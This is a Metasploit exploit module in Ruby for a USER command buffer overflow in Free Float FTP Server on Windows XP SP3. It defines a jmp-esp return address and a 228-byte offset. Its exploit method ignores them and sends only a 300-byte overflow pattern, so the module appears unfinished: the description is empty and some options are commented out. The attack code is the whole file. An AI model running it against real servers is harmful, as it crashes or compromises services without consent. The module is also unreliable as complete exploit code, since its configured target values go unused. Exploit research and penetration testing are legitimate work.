##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#	http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
	Rank = LowRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'			 => 'Free Float FTP Server USER Command Buffer Overflow',
			'Description'	 => %q{
			},
			'Platform'		 => 'win',
			'Author'		 =>
				[
					'D35m0nd142', # Original exploit
					'Doug Prostko <dougtko[at]gmail.com>' # MSF module
				],
			'License'		 => MSF_LICENSE,
			'References'	 =>
				[
					[ 'OSVDB', '69621'],
					[ 'EDB', '23243']
				],
			'Privileged'	 => false,
			'Payload'		 =>
				{
					'Space'          => 500,
					#'DisableNops'    => true,
					#'BadChars'       => "\x00\x0a\x0d\x20\x5c",
					#'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'Targets'		 =>
				[
					[ 'Windows XP SP3',
						{
							'Ret' => 0x7E379353, # jmp esp from C:\Program Files\PMSystem\Temp\tmp0.dll
							'Offset'   => 228
						}
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Jun 12 2012'))
		register_options(
			[
				#OptAddress.new('SOURCEIP', [false, 'The local client address'])
			], self.class)
	end

	def exploit
		connect
		buf = pattern_create(300)
		send_cmd( ['USER ', buf], false )
		disconnect
	end

end
